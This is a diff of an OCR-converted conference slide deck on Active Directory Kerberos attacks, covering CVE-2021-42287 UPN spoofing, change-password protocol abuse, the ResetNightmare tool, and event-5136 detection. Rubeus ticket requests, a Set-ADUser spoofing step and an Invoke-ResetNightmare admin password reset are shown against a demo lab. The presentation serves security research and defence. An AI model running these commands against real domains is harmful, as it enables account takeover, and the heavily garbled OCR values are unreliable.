-INnSCPXTQ+KmNpSNwICY3LwkQ3qikvWAeuF zv5d3NIJpwor/9U8+/IXIZF6nFZN/rPJFCOGHT6BEOPG8RNZ8L8boB5yMK5b+VQiT LLDBtF8/@M6Hd6bW7ycCynFdMrCRUuBQEMSi TPEK9XYgRMZo
-l42euxz7HJUL3ipOAmbgxQOm8KK 1Awy+qnSABzjC2HN2ret7durENCCcZ8cW2awPdT en68PUGd7/M6h7gGrS17T82GZG+kD1tH/RjULNGZD8kzBIZGgT4A5zng6cSRwusal eoMqVaeSdBVYPow
-ICigcsEgch9gcUwgcKggb8wgbwwgbmgk ZApOAMCARKhI gQgh2/PIL2b5AhvirTkfqIqNGODOKzS5rsWbLSnUG2WX5zuhChs IREVNTy SMQUK iF ZAVOAMCAQGhD J AMGwpE ZW1VvQWRtaW4xowcDBQB
-INz LyMTI1M1qnERgPMjAyNjA3MTQxMj EyYNTNaqgAobCERF TU8UTEFCGRCWFaADAgECOQ4wDBSEDGRhCBSEZGMWMQ==
 ServiceName : Ildap/dce1
 ServiceRealm : _DEMO.LAB
 UserName : [DemoAdmin1 (NT_ENTERPRISE) |
@@ -1033,22 +912,18 @@ StartTime : 7/7/2026 5:14:23 AM
 EndTime : 7/7/2026 3:12:53 PM
 RenewTill : 7/14/2026 5:12:53 AM
 Flags : mame_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
-KeyType :  aes256_cts_hmac_sha1
-Base64(key) : h2/PIL2b5AhvirTkfqIqNGODOKzSrswWbLSnUG2WX5zs=
 re I
-USA
-black hat
 ```
 
 ## Slide 60
 
 ### PREVIOUS PATCH #2: CVE-2021-42287
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PREVIOUS PATCH fa:
-CVE-2021-4228'7
 ClientName :
 Client Id : 7/7/2026 5:12:53 AM
 Client Name : DemoAdmini
@@ -1058,31 +933,25 @@ UPN : DemoAdmini
 Flags ; (2) EXTENDED
 SamName : UPNUser
 Sid : $-1-5-21-265452/649-3062338432-4A1/080399-1116
-black hat
-Qys4.
 ```
 
 ## Slide 61
 
 ### PREVIOUS PATCH #2: CVE-2021-42287
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 PREVIOUS PATCH fa:
-CVE-2021-4228'7
 IPS C:\Users\notadmin\Desktop> Set-ADUser UPNUser -Clear UserPrincipalName
 PS C:\Users\notadmin\Desktop> Get-ADObject -LD ilter “userprincipalname=DemoAdmin1*"
 >> select DistinguishedName, SamAccountName, UserPrincipalName
 DistinguishedName
-ICN=DemoAdmin1 , OU=Admin,, DC=demo , DC=lab
 SamAccountName UserPrincipalName
 DemoAdmin1
 DemoAdmini@demo. lab
 IPS C:\Users\notadmin\Desktop> .\Rubeus.exe asktgs /ticket:$tgt /service:ldap/dce@1 /nowrap
-}_ /EIT IT) ~\I_ UII 1 W_)
-11 \\ELIET IL) )—_I LI I |
-II |_I__/|__/I] )__/(__/
 v2.3.3
 [*] Action: Ask TGS
 [*] Requesting default etypes (RC4_HMAC, AES[128/256] CTS HMAC _SHA1) for the service ticket
@@ -1090,9 +959,6 @@ v2.3.3
 [*] Using domain controller: DC@1.demo.lab (192.168.0.11)
 [X] KRB-ERROR (2@) :|KDC_ERR_TGT_REVOKED
 s SamAccountName,UserPrincipalName |
-black hat
-@ys4
-2026
 ```
 
 ## Slide 62
@@ -1103,7 +969,8 @@ black hat
 
 •By default, every AD user can change their own password
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 THE KERBEROS CHANGE
@@ -1118,14 +985,9 @@ message length
 AP_REQ length
 | prot
 2
-9G@12345678901234567898012345678901
-4+-+-+-+-4+-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-
 ocol version
-+-+-4+-+-4+-4+-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4+-4-4-4+-4-4-4-
 AP_REQ data
-4+-+-+-+-4+-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-
 KRB-PRIV message
-+-+-4+-+-4+-4+-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-4-
 3
 +-+-+-+-+-+
 number |
@@ -1134,15 +996,14 @@ number |
 +-+-+-+-+-+
 /
 +-+-+-+-+-+
-black hat
-2026
 ```
 
 ## Slide 64
 
 ### THE KERBEROS CHANGE PASSWORD PROTOCOL
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 THE KERBEROS CHANGE
@@ -1154,15 +1015,14 @@ newpasswd[@] OCTET STRING,
 targname[1] PrincipalName OPTIONAL,
 targrealm[2] Realm OPTIONAL
 }
-black hat
-2026
 ```
 
 ## Slide 65
 
 ### THE KERBEROS CHANGE PASSWORD PROTOCOL
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 THE KERBEROS CHANGE
@@ -1173,8 +1033,6 @@ msg-type [1] INTEGER (14),
 ap-options [2] APOptions,
 ticket [3] Ticket,
 authenticator [4] EncryptedData -- Authenticator
-black hat
-2026
 ```
 
 ## Slide 66
@@ -1242,10 +1100,10 @@ Success?
 
 DEMO #4
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-© ® administrator: windows Pow X +
 Ps C:\Users\Attacker\Desktop> hostname
 Host1
 Ps C:\Users\Attacker\Desktop> whoami
@@ -1303,22 +1161,14 @@ DETECTION
 
 5136
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-DETECTION - KerberLoss
-black hat
-USA
-2026
-```
-
 ## Slide 77
 
 ### DETECTION - ResetNightmare
 
 5136
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DETECTION - ResetNightmare
@@ -1327,9 +1177,6 @@ Directo
 Object:
 DN:
 GUID:
-black hat
-USA
-2026
 ```
 
 ## Slide 78
@@ -1338,23 +1185,22 @@ USA
 
 5136
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DETECTION - ResetNightmare
 A directory servic | was modifie
 Directo
 ication © orrelati on ID:
-black hat
-USA
-2026
 ```
 
 ## Slide 79
 
 DETECTION - ResetNightmare
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 DETECTION - ResetNightmare
@@ -1364,10 +1210,7 @@ nt Domain:
 ional Information:
 Pri
 Information
-N,
 Info
-black hat
-2026
 ```
 
 ## Slide 80
@@ -1376,7 +1219,8 @@ black hat
 
 <u>https://github.com/Semperis-Community/ ResetNightmare</u>
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ResetNighmare tool
@@ -1396,9 +1240,6 @@ PS> Invoke-ResetNightmare -TargetAccount DemoAdmin1 -TargetNewPassword toolPassw
 Success! You can now authenticate as DemoAdmin1 with the password toolPassword1
 To spawn a new netonly process:
 Rubeus.exe asktgt /user:DemoAdmini1 /password:toolPassword1 /suppenctype:AES256 /nowrap /createnetonly:cmd.exe /show
-black hat
-USA
-2026
 ```
 
 ## Slide 81
